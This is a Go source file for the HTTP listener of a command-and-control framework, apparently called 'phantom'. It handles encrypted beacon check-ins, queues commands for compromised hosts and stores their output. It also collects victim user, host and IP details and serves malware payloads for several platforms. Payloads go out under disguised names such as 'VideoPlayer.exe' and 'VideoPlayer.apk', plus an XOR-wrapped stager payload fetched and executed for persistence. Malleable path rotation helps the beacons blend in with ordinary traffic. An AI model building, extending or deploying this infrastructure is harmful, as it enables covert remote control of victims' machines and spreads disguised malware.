// server.go — the data-plane HTTP surface.
//
// Route-for-route compatible with phantom.core.c2_server so the UNMODIFIED
// C++ beacon cannot tell which backend answered. Two invariants from the
// Python listener are load-bearing and preserved verbatim:
//
//  1. The malleable catch-all routes by CONTENT, not by path. The beacon
//     rotates GET/POST paths and randomises their casing; exact-path routing
//     would 404 most rotated URIs and silently drop the session.
//  2. An unmatched `/api/*` request WITHOUT a beacon id returns 404 — never a
//     benign body, which would turn operator mistakes into silent no-ops.
package main

import (
	"crypto/hmac"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	maxResultOutputBytes = 10 * 1024 * 1024
	maxRequestBody       = 50 * 1024 * 1024
	// B-3: the per-beacon HMAC signs the BODY, so the body must be read
	// before authorize() can run. Cap that pre-auth read tightly instead of
	// letting an unauthenticated peer make the listener buffer 50 MiB.
	maxCheckinBody = 256 * 1024
	maxResultBody  = 12 * 1024 * 1024
)

// payloadFiles maps a download path to the file served from the beacon dir.
var payloadFiles = map[string]string{
	"/api/v1/payload":                "beacon.pe",
	"/api/v1/payload_pic":            "beacon.bin",
	"/api/v1/payload_linux":          "beacon_linux",
	"/api/v1/payload_linux_x86":      "beacon_linux_x86",
	"/api/v1/payload_macos":          "beacon_macos",
	"/api/v1/payload_android":        "beacon_android",
	"/api/v1/remote_payload_windows": "remote.exe",
	"/api/v1/remote_payload_linux":   "remote_linux",
	"/api/v1/remote_payload_macos":   "remote_macos",
	"/api/v1/remote_payload_android": "remote.apk",
}

// payloadDownloadName is the browser-facing filename (a file with no
// extension cannot be run on Windows nor installed on Android).
var payloadDownloadName = map[string]string{
	"/api/v1/payload":                "VideoPlayer.exe",
	"/api/v1/payload_pic":            "beacon.bin",
	"/api/v1/payload_linux":          "video-player-linux",
	"/api/v1/payload_linux_x86":      "video-player-linux-x86",
	"/api/v1/payload_macos":          "video-player-macos",
	"/api/v1/payload_android":        "VideoPlayer.apk",
	"/api/v1/remote_payload_windows": "remote.exe",
	"/api/v1/remote_payload_linux":   "remote-linux",
	"/api/v1/remote_payload_macos":   "remote-macos",
	"/api/v1/remote_payload_android": "remote.apk",
}

// Server binds the store and key material to an HTTP handler.
type Server struct {
	cfg    *Config
	store  *Store
	guard  *ReplayGuard
	logger *log.Logger
}

// NewServer builds a listener over the given store.
func NewServer(cfg *Config, store *Store, logger *log.Logger) *Server {
	return &Server{
		cfg:    cfg,
		store:  store,
		guard:  NewReplayGuardAt(filepath.Join(cfg.DataDir, "c2_replay.json")),
		logger: logger,
	}
}

// Handler returns the routed, wrapped HTTP handler.
func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/v1/ping", s.beacon(maxCheckinBody, s.handleCheckin))
	mux.HandleFunc("POST /api/v1/ping", s.beacon(maxCheckinBody, s.handleCheckin))
	mux.HandleFunc("POST /api/v1/result", s.beacon(maxResultBody, s.handleResult))
	mux.HandleFunc("GET /api/v1/beacons", s.operator(s.handleBeacons))
	mux.HandleFunc("POST /api/v1/queue", s.operator(s.handleQueue))
	mux.HandleFunc("GET /api/v1/results", s.operator(s.handleResults))
	// C-3: advertise what this data plane actually implements, so an operator
	// (and `doctor`) can see the boundary instead of discovering it from a
	// 501 mid-engagement.
	mux.HandleFunc("GET /api/v1/capabilities", s.operator(s.handleCapabilities))
	for path := range payloadFiles {
		p := path
		mux.HandleFunc("GET "+p, s.transferToken(s.handlePayload(p)))
	}
	// /x (PIC) is a plain file fetch, ported here (C-3). /s/android needs the
	// Python dropper generator and stays in the control plane: answer
	// honestly instead of 404-ing silently.
	mux.HandleFunc("GET /x", s.transferToken(s.handlePIC))
	mux.HandleFunc("GET /s/android", s.transferToken(s.handleNotPorted))
	// The root and the malleable catch-all. {$} matches ONLY "/".
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "C2 OK")
	})
	mux.HandleFunc("GET /{tail...}", s.handleCatchAll)
	mux.HandleFunc("POST /{tail...}", s.handleCatchAll)
	return mux
}

// ── middleware ─────────────────────────────────────────────────────────

type beaconHandler func(http.ResponseWriter, *http.Request, string)

func (s *Server) beacon(maxBytes int64, next beaconHandler) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		beaconID := r.Header.Get("X-Beacon-Id")
		if beaconID == "" {
			http.Error(w, "missing beacon id", http.StatusBadRequest)
			return
		}
		body := readBody(w, r, maxBytes)
		if !s.authorize(r, beaconID, body) {
			s.logger.Printf("unauthenticated request rejected for %s from %s",
				beaconID, r.RemoteAddr)
			s.store.audit("beacon_auth_failed", map[string]any{"beacon_id": beaconID})
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r, body)
	}
}

// operator guards the REST control endpoints: client certificate (when mTLS
// is on) AND the API token.
func (s *Server) operator(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if s.cfg.MTLS && (r.TLS == nil || len(r.TLS.PeerCertificates) == 0) {
			http.Error(w, "mTLS client certificate required", http.StatusUnauthorized)
			return
		}
		if s.cfg.APIToken != "" {
			token := r.Header.Get("X-Api-Token")
			if !hmac.Equal([]byte(token), []byte(s.cfg.APIToken)) {
				http.Error(w, "Forbidden", http.StatusForbidden)
				return
			}
		}
		next(w, r)
	}
}

// transferToken guards payload downloads with the payload token.
func (s *Server) transferToken(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !s.payloadTokenOK(r) {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}
		next(w, r)
	}
}

// payloadTokenOK accepts the deployment payload token (legacy beacons and the
// operator's own curl one-liners) or a PER-BEACON token derived from the
// identity in X-Beacon-Id — a header every beacon already sends on
// payload-fetch routes, so a captured enrolled binary authorises only its own
// download. Fresh builds carry no deployment token at all.
func (s *Server) payloadTokenOK(r *http.Request) bool {
	token := r.Header.Get("X-Auth-Token")
	if token == "" {
		return false
	}
	if s.cfg.PayloadToken != "" &&
		hmac.Equal([]byte(token), []byte(s.cfg.PayloadToken)) {
		return true
	}
	beaconID := r.Header.Get("X-Beacon-Id")
	if beaconID == "" {
		return false
	}
	for _, secret := range s.store.BeaconSecrets(beaconID) {
		if expected := DownloadToken(secret, beaconID); expected != "" &&
			hmac.Equal([]byte(token), []byte(expected)) {
			return true
		}
	}
	return false
}

// ── per-beacon envelope keys ───────────────────────────────────────────

// envelopeKeys returns the keys to try for one beacon, most specific first.
// The deployment key stays LAST on purpose: identities enrolled before
// per-beacon derivation, and builds with auth disabled, still speak it.
func (s *Server) envelopeKeys(beaconID string) [][]byte {
	keys := [][]byte{}
	for _, secret := range s.store.BeaconSecrets(beaconID) {
		if key := EnvelopeKey(secret, beaconID); len(key) == 32 {
			keys = append(keys, key)
		}
	}
	return append(keys, s.cfg.AESKey)
}

// decryptFor opens a body from one beacon, or returns the last error.
func (s *Server) decryptFor(beaconID, body string) (string, error) {
	lastErr := ErrShortCiphertext
	for _, key := range s.envelopeKeys(beaconID) {
		plain, err := Decrypt(key, body)
		if err == nil {
			return plain, nil
		}
		lastErr = err
	}
	return "", lastErr
}

// encryptFor seals a response with the key THAT beacon expects.
func (s *Server) encryptFor(beaconID, plaintext string) (string, error) {
	return Encrypt(s.envelopeKeys(beaconID)[0], plaintext)
}

// authorize verifies the per-beacon HMAC and the anti-replay nonce.
func (s *Server) authorize(r *http.Request, beaconID, body string) bool {
	secrets := s.store.BeaconSecrets(beaconID)
	if len(secrets) == 0 {
		// Fail closed: an unenrolled identity is tolerated ONLY when auth is
		// explicitly disabled AND the listener is bound to loopback. A
		// 0.0.0.0 listener must never become an open C2 by default.
		if !beaconAuthRequired() && isLoopbackHost(s.cfg.Bind) {
			return true
		}
		return false
	}
	ts := r.Header.Get("X-Beacon-Timestamp")
	counter := r.Header.Get("X-Beacon-Counter")
	nonce := r.Header.Get("X-Beacon-Nonce")
	sig := r.Header.Get("X-Beacon-Auth")
	now := time.Now().Unix()
	ok := false
	for _, secret := range secrets {
		if Verify(secret, r.Method, r.URL.Path, ts, counter, nonce, sig, body,
			now, DefaultMaxSkew) {
			ok = true
			break
		}
	}
	if !ok {
		return false
	}
	cv, _ := VerifyCounter(counter)
	if err := s.guard.Check(beaconID, nonce, cv); err != nil {
		s.logger.Printf("replay rejected for %s: %v", beaconID, err)
		return false
	}
	return true
}

// ── beacon handlers ────────────────────────────────────────────────────

func (s *Server) handleCheckin(w http.ResponseWriter, r *http.Request, body string) {
	beaconID := r.Header.Get("X-Beacon-Id")
	info := map[string]any{
		"ip":        remoteHost(r.RemoteAddr),
		"last_seen": time.Now().Format("2006-01-02T15:04:05"),
	}
	if body != "" {
		if dec, err := s.decryptFor(beaconID, body); err == nil {
			applyTelemetry(info, dec)
		} else {
			s.logger.Printf("telemetry decrypt failed for %s", beaconID)
		}
	}
	existed := s.store.Registered(beaconID)
	s.store.UpdateBeacon(beaconID, info)
	s.store.audit("beacon_checkin", map[string]any{
		"beacon_id": beaconID, "new": !existed, "ip": info["ip"]})

	tasks := s.store.PendingTasks(beaconID)
	payload, err := json.Marshal(map[string]any{"tasks": tasks})
	if err != nil {
		http.Error(w, "encode failed", http.StatusInternalServerError)
		return
	}
	encoded, err := s.encryptFor(beaconID, string(payload))
	if err != nil {
		http.Error(w, "encrypt failed", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	io.WriteString(w, encoded)
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request, body string) {
	beaconID := r.Header.Get("X-Beacon-Id")
	dec, err := s.decryptFor(beaconID, body)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	s.storeDecodedResult(w, beaconID, dec)
}

// storeDecodedResult validates and stores an ALREADY-decrypted result. Split
// out so the malleable catch-all (B-5) can route on a single decrypt instead
// of decrypting twice and sniffing for the substring "task_id".
func (s *Server) storeDecodedResult(w http.ResponseWriter, beaconID, dec string) {
	var data struct {
		TaskID string `json:"task_id"`
		Output string `json:"output"`
	}
	if err := json.Unmarshal([]byte(dec), &data); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	if data.TaskID == "" || len(data.TaskID) > 256 {
		http.Error(w, "Invalid task_id", http.StatusBadRequest)
		return
	}
	if !s.store.Registered(beaconID) {
		http.Error(w, "Unknown beacon", http.StatusNotFound)
		return
	}
	if len([]byte(data.Output)) > maxResultOutputBytes {
		http.Error(w, "Result too large", http.StatusRequestEntityTooLarge)
		return
	}
	s.store.AddResult(beaconID, data.TaskID, data.Output)
	s.store.audit("result_stored", map[string]any{
		"beacon_id": beaconID, "task_id": data.TaskID,
		"bytes": len(data.Output)})
	io.WriteString(w, "OK")
}

// ── operator handlers ──────────────────────────────────────────────────

func (s *Server) handleBeacons(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusOK, s.store.Beacons())
}

func (s *Server) handleQueue(w http.ResponseWriter, r *http.Request) {
	var body struct {
		BeaconID string `json:"beacon_id"`
		Command  string `json:"command"`
	}
	if err := json.NewDecoder(io.LimitReader(r.Body, maxRequestBody)).Decode(&body); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "invalid JSON"})
		return
	}
	// NOTE: the capability/grant task policy lives in the Python control
	// plane. This endpoint is operator-only (mTLS + token); do not expose it
	// beyond the operator network until the policy is ported.
	if _, err := s.store.QueueTask(body.BeaconID, body.Command); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error()})
		return
	}
	s.store.audit("task_queued", map[string]any{
		"beacon_id": body.BeaconID, "bytes": len(body.Command)})
	writeJSON(w, http.StatusOK, map[string]any{"status": "queued"})
}

func (s *Server) handleResults(w http.ResponseWriter, r *http.Request) {
	beaconID := r.URL.Query().Get("beacon_id")
	if beaconID == "" {
		// B-4: a malformed request is a 400, not a 200 with an error body.
		writeJSON(w, http.StatusBadRequest, map[string]any{
			"error": "beacon_id required"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"results": s.store.Results(beaconID)})
}

// handleCapabilities reports the boundary between this Go data plane and the
// Python control plane (C-3/D-2). Anything false here is served by the Python
// listener and answered with 501 on this surface.
func (s *Server) handleCapabilities(w http.ResponseWriter, _ *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{
		"data_plane":     "c2d",
		"wire_protocol":  "v1",
		"checkin":        true,
		"results":        true,
		"payloads":       true,
		"replay_persist": true,
		"audit_log":      s.store.auditEnabled(),
		"task_policy":    false, // D-2: capability/grant policy stays in Python
		"stager_pic":     true,  // C-3: /x is served from PayloadDir here
		"stager_android": false, // C-3: /s/android needs the Python generator
		"operator_api":   true,
	})
}

func (s *Server) handlePayload(path string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		file := payloadFiles[path]
		full := filepath.Join(s.cfg.PayloadDir, file)
		f, err := os.Open(full)
		if err != nil {
			http.Error(w, "payload not built", http.StatusNotFound)
			return
		}
		defer f.Close()
		info, err := f.Stat()
		if err != nil || info.IsDir() {
			http.Error(w, "payload not built", http.StatusNotFound)
			return
		}
		name := payloadDownloadName[path]
		w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeContent(w, r, file, info.ModTime(), f)
	}
}

// handlePIC serves the XOR-wrapped PIC payload on /x, byte-identical to what
// the Python listener serves. It is NOT a browser download, so there is no
// Content-Disposition: the persistence/stager path fetches and executes it.
func (s *Server) handlePIC(w http.ResponseWriter, r *http.Request) {
	full := filepath.Join(s.cfg.PayloadDir, "beacon_xored.bin")
	f, err := os.Open(full)
	if err != nil {
		http.Error(w, "payload not built", http.StatusNotFound)
		return
	}
	defer f.Close()
	info, err := f.Stat()
	if err != nil || info.IsDir() {
		http.Error(w, "payload not built", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	http.ServeContent(w, r, "beacon_xored.bin", info.ModTime(), f)
}

func (s *Server) handleNotPorted(w http.ResponseWriter, _ *http.Request) {
	http.Error(w, "this stager is served by the Python control plane (c2d "+
		"does not port it yet)", http.StatusNotImplemented)
}

// ── malleable catch-all ────────────────────────────────────────────────

func (s *Server) handleCatchAll(w http.ResponseWriter, r *http.Request) {
	beaconID := r.Header.Get("X-Beacon-Id")
	if beaconID == "" {
		if strings.HasPrefix(r.URL.Path, "/api/") {
			writeJSON(w, http.StatusNotFound,
				map[string]any{"error": "unknown API endpoint"})
			return
		}
		io.WriteString(w, "C2 OK")
		return
	}
	if r.Method == http.MethodGet {
		if !s.authorize(r, beaconID, "") {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		s.handleCheckin(w, r, "")
		return
	}
	body := readBody(w, r, maxResultBody)
	if !s.authorize(r, beaconID, body) {
		s.store.audit("beacon_auth_failed", map[string]any{"beacon_id": beaconID})
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	// B-5: decrypt ONCE and route on a real JSON field, not on the
	// substring "task_id" (which a beacon's OUTPUT could contain, or which a
	// different JSON shape could fake).
	if body != "" {
		if dec, err := s.decryptFor(beaconID, body); err == nil {
			var probe struct {
				TaskID *string `json:"task_id"`
			}
			if json.Unmarshal([]byte(dec), &probe) == nil &&
				probe.TaskID != nil && *probe.TaskID != "" {
				s.storeDecodedResult(w, beaconID, dec)
				return
			}
		}
	}
	s.handleCheckin(w, r, body)
}

// ── TLS ────────────────────────────────────────────────────────────────

// TLSConfig builds the server TLS config: a 1.2 floor, AEAD-only suites and
// the client-certificate requirement from the config.
func (s *Server) TLSConfig() (*tls.Config, error) {
	certFile, keyFile := "server.crt", "server.key"
	if s.cfg.MTLS {
		certFile, keyFile = "mtls_server.crt", "mtls_server.key"
	}
	cert, err := tls.LoadX509KeyPair(filepath.Join(s.cfg.CertsDir, certFile),
		filepath.Join(s.cfg.CertsDir, keyFile))
	if err != nil {
		return nil, err
	}
	conf := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
		},
	}
	if s.cfg.MTLS {
		pool := x509.NewCertPool()
		pem, err := os.ReadFile(filepath.Join(s.cfg.CertsDir, "client_ca.crt"))
		if err != nil {
			return nil, err
		}
		if !pool.AppendCertsFromPEM(pem) {
			return nil, err
		}
		conf.ClientCAs = pool
		if s.cfg.MTLSRequireClientCert {
			conf.ClientAuth = tls.RequireAndVerifyClientCert
		} else {
			conf.ClientAuth = tls.VerifyClientCertIfGiven
		}
	}
	return conf, nil
}

// ── helpers ────────────────────────────────────────────────────────────

// readBody reads at most limit bytes. It uses http.MaxBytesReader (not just
// io.LimitReader) so an over-sized body is cut off at the socket and the
// connection is closed instead of being silently truncated.
func readBody(w http.ResponseWriter, r *http.Request, limit int64) string {
	if r.Body == nil {
		return ""
	}
	r.Body = http.MaxBytesReader(w, r.Body, limit)
	raw, _ := io.ReadAll(r.Body)
	return string(raw)
}

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func remoteHost(addr string) string {
	if host, _, err := net.SplitHostPort(addr); err == nil {
		return host
	}
	return addr
}

func beaconAuthRequired() bool {
	v := strings.ToLower(strings.TrimSpace(os.Getenv("PHANTOM_BEACON_AUTH_REQUIRED")))
	return v != "" && v != "0" && v != "false" && v != "no" && v != "off"
}

func isLoopbackHost(host string) bool {
	switch strings.ToLower(strings.TrimSpace(host)) {
	case "127.0.0.1", "::1", "localhost":
		return true
	}
	return false
}

// applyTelemetry parses the sysinfo/netinfo lines the beacon sends.
func applyTelemetry(info map[string]any, payload string) {
	var data map[string]any
	if err := json.Unmarshal([]byte(payload), &data); err != nil {
		return
	}
	sysinfo, _ := data["sysinfo"].(string)
	netinfo, _ := data["netinfo"].(string)
	for _, line := range strings.Split(sysinfo, "\n") {
		switch {
		case strings.HasPrefix(line, "OS: "):
			info["os"] = strings.TrimSpace(line[4:])
		case strings.HasPrefix(line, "User: "):
			info["user"] = strings.TrimSpace(line[6:])
		case strings.HasPrefix(line, "Arch: "):
			info["arch"] = strings.TrimSpace(line[6:])
		case strings.HasPrefix(line, "Host: "):
			info["hostname"] = strings.TrimSpace(line[6:])
		}
	}
	var ips []string
	for _, line := range strings.Split(netinfo, "\n") {
		if idx := strings.Index(line, "IP: "); idx >= 0 {
			// A-5: a bare "IP: " line made strings.Fields(...) empty and
			// [0] panic the whole handler (a remote DoS from a beacon).
			if fields := strings.Fields(line[idx+4:]); len(fields) > 0 {
				ips = append(ips, fields[0])
			}
		} else if idx := strings.Index(line, "IP (v4): "); idx >= 0 {
			ips = append(ips, strings.TrimSpace(line[idx+9:]))
		}
	}
	if len(ips) > 0 {
		info["local_ips"] = strings.Join(ips, ", ")
	}
}
